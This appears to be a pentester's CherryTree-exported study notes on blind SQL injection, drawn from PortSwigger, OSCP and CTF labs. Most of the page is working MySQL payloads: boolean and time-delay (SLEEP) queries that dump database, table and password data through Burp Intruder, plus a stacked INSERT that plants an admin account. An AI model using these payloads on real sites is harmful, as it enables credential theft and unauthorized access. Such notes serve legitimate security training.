<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Blind</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Blind</h1><br/><p>[Portswigger 66-74]</p><p></p><p><h1>Tradecraft</h1></p><p><h2>View Output</h2></p><p>If you can <span style="color:#ff0000;">write output to accessible file </span>on a Web App, you <span style="color:#ff0000;">can view query results</span> by navigating to that URL</p><p></p><p><h2>ID DBMS</h2></p><p>Look for a change in behavior when testing built-in func&#39;s (e.g if <strong>version()</strong> throws an error but <strong>@@version</strong> doesn&#39;t, it&#39;s likely MSSQL)</p><p></p><p><h2>Isolate a Row</h2></p><p>Can only query 1 row at a time, so first <span style="color:#ff0000;">determine number of rows</span> (e.g <strong>COUNT()</strong> works for multiple DBMS).</p><p></p><p>Limit query to 1st row (e.g with <strong>LIMIT</strong> <strong>1</strong> for MySQL or <strong>TOP(1)</strong> for MSSQL) &amp; determine its length (e.g with <strong>LEN()</strong>). After enumerating 1st row, exlcude it from subsequent queries.</p><p></p><p>Try to determine 1st letter(s) of other entries so you can limit queries to the row that starts with that specific character(s).</p><p></p><p>For example, on the 2nd query you can use <strong>LIMIT 1</strong> &amp; <strong>WHERE</strong> statement to exclude the previously identified string.</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Time Delay Tip</span>: If your query will cause a delay of 3 seconds if a row starts with the letter Q, &amp; the delay is 6 seconds, that means there are 2 rows which fit the criteria!</p><p></p><p><h3>Caution</h3></p><p>MSSQL&#39;s <strong>TOP()</strong> is only reliable for the 1st row &amp; other methods must be used for the rest (i.e IF statement to query a row based off of 1st character)!</p><p></p><p>Same limitations may/may not apply to similar func&#39;s used by other DBMS&#39;s (e.g <strong>LIMIT</strong> for MySQL)</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Q</span>: Could this be overcome by using <strong>ORDER BY</strong> to change which row is queried for <strong>TOP(1) </strong>?</p><p></p><p><h2>★</h2><h2>Determine Case of Dumped String</h2><h2>★</h2></p><p>[CTF B 16-17]</p><p></p><p>SQL languages are case-insensitive (at least most are), but credentials are not. When exploiting a Blind Vulnerability, an ordinary payload will fail to differentiate between data with uppercase &amp; lowercase letters.</p><p></p><p>You can fix this by converting the letters to <strong>BINARY</strong>, where uppercase &amp; lowercase letters have different values.</p><p></p><p><h1>Update a Table</h1></p><p>May be able to update a table to add a new user allowing you to login to webapp, even if you don&#39;t have the privs to write to a file! [OSCP 94-95]</p><p></p><p>&#39;; INSERT INTO admin (id, username, password, firstname, lastname, photo, created_on) VALUES (2, &#39;dave&#39;, &#39;$2y$10$fCOiMky4n5hCJx3cpsG20Od4wHtlkCLKmO6VLobJNRIg9ooHTkgjK&#39;, &#39;Neovic&#39;, &#39;Devierte&#39;, &#39;facebook-profile-image.jpeg&#39;, &#39;2018-04-30&#39;);&#39;-- //</p><p></p><p></p><p><h1>Boolean Conditional Responses</h1><h1></h1></p><p><h1></h1>[CTF B 153]</p><p></p><p>I prefer automating queries by using Burp&#39;s <strong>Intruder</strong>, except for determining the length of a string / name. In that case, I think it&#39;s faster to use the <strong>Repeater</strong> to guess &amp; check lengths.</p><p></p><p><span style="color:#060f94;text-decoration:underline;">IMPORTANT</span>: Ensure you&#39;re always limiting the results to only query 1 thing at a time (1 DB, 1 Table, etc). For subsequent queries, keep the <strong>LIMIT 1</strong> statement, but exclude the previous result with a <strong>WHERE</strong> statement.</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Resource</span>: Alternate syntax, &amp; an example of how to use a shell script instead of burp is available <a href="https://medium.com/@The_Hiker/tryhackme-kitty-in-depth-walkthrough-thehiker-59c089404fb7">here</a>. For example, a SQLi syntax used was</p><p></p><p><strong>’ AND EXISTS (SELECT 1 FROM information_schema.tables WHERE table_schema = database() AND BINARY table_name LIKE ‘a%’) — -</strong></p><p></p><p><h1>Determine String Length</h1></p><p>The <strong>%</strong> Wildcard represents any 0+ characters, so you need to use the <strong>_ </strong>Wildcard which is any 1 character. Wildcards <span style="color:#ff0000;">must be used with </span>a <strong><span style="color:#ff0000;">LIKE</span></strong> statement &amp; not <strong>=</strong>.</p><p></p><p>The following syntax is for MySQL, but it can be slightly modified for other DBMS.</p><p></p><p><h3>Database Name</h3></p><p><span style="color:#8ff0a4;text-decoration:underline;">Built-In Functions</span>: You may be able to use built-in functions like MySQL&#39;s <strong>database()</strong>, but the more reliable method is to query the master schema. In this case, don&#39;t need to <strong>LIMIT 1</strong> because <strong>database()</strong> only queries current DB.</p><p></p><p>If you&#39;re not using a built-in function, would probably need to use something like <strong>information_schema.schemata</strong> (off the top of my head, verify the name)</p><p></p><p>Iterate through numbers until the behavior changes (e.g. the Login Bypass worked at 9, but stopped working at 10)</p><p></p><p><strong>&#39; AND SUBSTRING(database(),</strong>9<strong>,1) LIKE &#39;_&#39;-- //</strong></p><p></p><p><h3>Table Name</h3></p><p>Since there are more than 1 tables, need to include the <strong>LIMIT 1</strong> statement. To enumerate the next table, keep the <strong>LIMIT 1</strong>, but exclude the previous table using a <strong>WHERE</strong> statement</p><p></p><p><strong>&#39; AND SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=&#39;mywebsite&#39; LIMIT 1),</strong>10<strong>,1) LIKE &#39;_&#39;-- //</strong></p><p></p><p><h3>Column Name</h3></p><p><strong>&#39; AND SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name=&#39;siteusers&#39; LIMIT 1),</strong>2<strong>,1) LIKE &#39;_&#39;-- //</strong></p><p></p><p><h3>Row Data</h3></p><p>To query the data from a specific column (e.g. password) in a specific table (e.g. siteusers) in a specific DB (e.g. mywebsite) </p><p></p><p><strong>&#39; AND SUBSTRING((SELECT password FROM mywebsite.siteusers LIMIT 1),</strong>5<strong>,1)=&#39;_&#39;-- //</strong></p><p></p><p><h2>Exfiltrate Data</h2></p><p></p><p><span style="color:#060f94;text-decoration:underline;">Sorting Results</span></p><p><strong><span style="text-decoration:underline;">A)</span></strong> When looking at the results from Burp&#39;s Intruder, identify a field which lets you seperate valid &amp; invalid results.</p><p></p><p>For example, the invalid Responses could be longer since they include the login failure message <strong>Invalid username or password</strong>.</p><p></p><p>This would let you sort results from shortest to longest Response <strong>Length</strong>, leaving the &quot;true&quot; statements at the top of the results.</p><p></p><p><strong><span style="text-decoration:underline;">B)</span></strong> Shift Click to select all Requests that evaluated “true” &amp; Right Click → <strong>Highlight</strong>.</p><p></p><p><strong><span style="text-decoration:underline;">C)</span></strong><strong> </strong>Sort results based off of <strong>Payload 1</strong>. This should list the results for each position, letting you quickly record the corresponding results from <strong>Payload 2</strong>.</p><p></p><p>Sometimes sorting by <strong>Payload 1</strong> is buggy, so confirm you&#39;re recording the right value for the corresponding position.</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Don&#39;t Interpret Wildcards</span>: Sometimes a name includes an <strong>_</strong>. To evaulate this character literally, instead of as a Wildcard, use <strong>=</strong> instead of <strong>LIKE</strong>.</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Payloads</span>: Typically want to use Intruder&#39;s <strong>Cluster Bomb</strong> mode, with<strong> Payload 1</strong> being numbers based off of the string&#39;s previously identified length &amp; <strong>Payload 2</strong> being lowercase letters.</p><p></p><p>You can also include numbers or special characters for <strong>Payload 2</strong>, but since these are less likely, it&#39;ll probably be faster to do a follow up Attack which evaluates only these characters for any missed positions.</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Deducing Names</span>: Sometimes it&#39;s possible to guess what a name is, &amp; then confirm it using Burp&#39;s Repeater. For example, if a column has a length of 2, check if it&#39;s<strong> id</strong>. If you found a column named <strong>username</strong>, check for <strong>password</strong>.</p><p></p><p><h3>Enumerate Databases</h3></p><p>If using the built-in<strong> database()</strong> function</p><p></p><p><strong>‘</strong> <strong>AND SUBSTRING(database(),</strong>1<strong>,1) = ’</strong>b<strong>&#39;-- //</strong></p><p></p><p><h3>Enumerate Tables</h3></p><p><strong>&#39; AND SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=&#39;mywebsite&#39; LIMIT 1),</strong>1<strong>,1) = &#39;</strong>a<strong>&#39;-- //</strong></p><p></p><p><h3>Enumerate Columns</h3></p><p><strong>&#39; AND SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name=&#39;siteusers&#39; AND column_name!=&#39;id&#39; LIMIT 1),</strong>1<strong>,1)=&#39;</strong>a<strong>&#39;-- //</strong></p><p></p><p><h3>Enumerate Row Data</h3></p><p><strong>&#39; AND SUBSTRING((SELECT password FROM mywebsite.siteusers LIMIT 1),</strong>1<strong>,1)=&#39;</strong>a<strong>&#39;-- //</strong></p><p></p><p><h3>Determining Letter Case</h3></p><p>[Alt method: CTF B 16-17]</p><p></p><p>SQL languages are typically case-insensitive, but credentials ARE case-sensitive. Therefore, it&#39;s important to determine if each letter is uppercase or lowercase.</p><p></p><p>The numeric representation of a letter in <strong>BINARY</strong> does vary based on the letter case, so converting the result to <strong>BINARY</strong> lets you determine whether or not the letter is uppercase.</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Payloads</span>: The fastest method is probably to <span style="color:#ff0000;">retrieve the Row Data normally</span>, &amp; then do a <span style="color:#ff0000;">follow up Attack</span> which <span style="color:#ff0000;">only evaluates the uppercase letter</span> for <span style="color:#ff0000;">that specific position</span> using Intruder&#39;s <strong>Pitch Fork</strong> mode. Any negative result indicates that the letter is lowercase.</p><p></p><p>For example, if the username is<strong> b0b</strong>, <strong>Payload 1</strong> will be the numbers <strong>1</strong> &amp; <strong>3</strong>, &amp; <strong>Payload 2</strong> will be <strong>B</strong> &amp; <strong>B</strong>.</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Case-insensitive Hashes</span>: Hashes shouldn&#39;t be case-sensitive, so if you are outputting one to crack with a tool like john, you probably don&#39;t need to worry about this.</p><p></p><p><strong>&#39; AND SUBSTRING((SELECT BINARY password FROM mywebsite.siteusers LIMIT 1),</strong>1<strong>,1)=&#39;</strong>L<strong>&#39;-- //</strong></p><p><h1></h1></p><p><h1>Conditional Response via SQL Errors</h1><h2></h2></p><p><h2></h2><h2></h2></p><p><h2></h2><h2></h2></p><p><h2></h2><h1>Triggering Time Delays</h1><h2></h2></p><p><h2></h2>[PortSwigger 70-74]</p><p></p><p>Quick tests can be performed with burp Repeater, but BF values is better done with Intruder.</p><p></p><p>Don&#39;t use payloads with upper/lowercase letters. Case insensitive queries. To determine case [CTF B 16]</p><p></p><p><h2>Choosing a Time Delay</h2></p><p>The shorter the time the more likely you are to get false positives, especially when increased traffic causes target to lag. ~3 seconds may be a good compromise to start with.</p><p></p><p><h2> Warning- Stacking Delays</h2></p><p> If you trigger a delay of 5 seconds when a statement is true (e.g if there is a database that starts with the letter “n”), &amp; it&#39;s true 4 times (4 DBs match that criteria), the target will sleep for 5x4=20 seconds.</p><p> Useful to quickly determine multiple names from 1 query, but longer wait times may make you big sad.</p><p> </p><p><span style="color:#8ff0a4;text-decoration:underline;">Exclude Default Databases</span>:  Exclude every default DB when querying schema. If there is no longer a delay, delete a letter from the name of a def DB &amp; see if that causes 1x delay to come back!</p><p></p><p><h2>Automate with Burp Intruder</h2></p><p>To query 1st value in a name, the following syntax works. To BF multiple string positions, use SUBSTRING [Portswigger 71-74]</p><p></p><p>&#39; UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,SLEEP(3) FROM apsystem.admin WHERE username like &#39;§§%&#39;-- //</p><p></p><p><span style="color:#8ff0a4;text-decoration:underline;">Payloads / Wordlists</span>: Most simple lists can be loaded in from <a href="file:///usr/share/wordlists/seclists/Fuzzing/">/usr/share/wordlists/seclists/Fuzzing/</a> (or copy the neccesary section &amp; hit <strong>paste</strong>)<span style="color:#8ff0a4;text-decoration:underline;"></span></p><p><span style="color:#8ff0a4;text-decoration:underline;"></span><span style="color:#8ff0a4;text-decoration:underline;"></span></p><p><span style="color:#8ff0a4;text-decoration:underline;">Intruder Columns</span>: Add a column to indicate how long the Resp took. In Intruder&#39;s Atk window see drop down menu <strong>Columns</strong> → <strong>Response Received</strong></p><p></p><p><h3>Determine Length</h3><span style="color:#237522;"></span></p><p><span style="color:#237522;"></span>&#39; UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,SLEEP(3) FROM apsystem.admin WHERE LENGTH(password) = &#39;§§&#39;-- //<span style="color:#237522;"></span></p><p><span style="color:#237522;"></span><span style="color:#237522;"></span></p><p><span style="color:#237522;"></span><h3>Determine Character Positions</h3><span style="color:#237522;"></span></p><p><span style="color:#237522;"></span><strong>Cluster Bomb</strong> Atk! </p><p>First payload set is based off of the prev determined length (e.g if it&#39;s 10, the payload is <strong>Numbers</strong> → <strong>From</strong> 1 <strong>To</strong> 10 <strong>Step</strong> 1)</p><p>Second can be case-insensitive alhpanum (36 entries). It&#39;ll miss spec chars, but those can be filled in later. For ex,  sometimes an underscore is used like a space (SQL treats _ as 1x wildcard, don&#39;t be confused. % is infinite wildcard)</p><p>If it&#39;s a hash, can assume there will be some $ for the salt (e.g $2y$10$fCOiMky4n5hCJx3cpsG20Od4wHtlkCLKmO6VLobJNRIg9ooHTkgjK)</p><p><span style="color:#237522;"></span></p><p><span style="color:#237522;"></span></p><p>&#39; UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,SLEEP(2) FROM apsystem.admin WHERE SUBSTRING(password,§1§,1) = &#39;§§&#39;-- //</p><p></p><p><h2>Query Databases</h2></p><p>For ex, if you MySQL target has 7 columns, may need to structure the query accordingly-</p><p></p><p>&#39; UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,SLEEP(10)-- //</p><p></p><p> &#39; UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,SLEEP(10) FROM information_schema.schemata WHERE schema_name like &#39;apsystem&#39;;-- //</p><p> </p><p> &#39; UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,SLEEP(5) FROM information_schema.schemata WHERE schema_name like &#39;%&#39; AND schema_name !=&#39;apsystem&#39; AND schema_name !=&#39;sys&#39; AND schema_name !=&#39;mysql&#39; AND schema_name !=&#39;information_schema&#39; AND schema_name !=&#39;performance_schema&#39;-- //</p><p> </p><p><h2> Query Tables</h2></p><p>&#39; UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,SLEEP(5) FROM information_schema.tables WHERE table_schema like &#39;apsystem&#39;-- //</p><p> </p><p><h2>Query Row data</h2></p><p>If you  know the DB &quot;apsystem&quot; has a table named “admin” with a column named “username”-</p><p> </p><p> &#39; UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,SLEEP(5) FROM apsystem.admin WHERE username like &#39;%&#39;-- //</p><p> </p><p> <h2></h2></p><p><h2></h2><h1>Out-of-Band Techniques</h1></p><p></p><p><h1>Tips</h1><ul><li></li></ul></p></div>
</body>
</html>
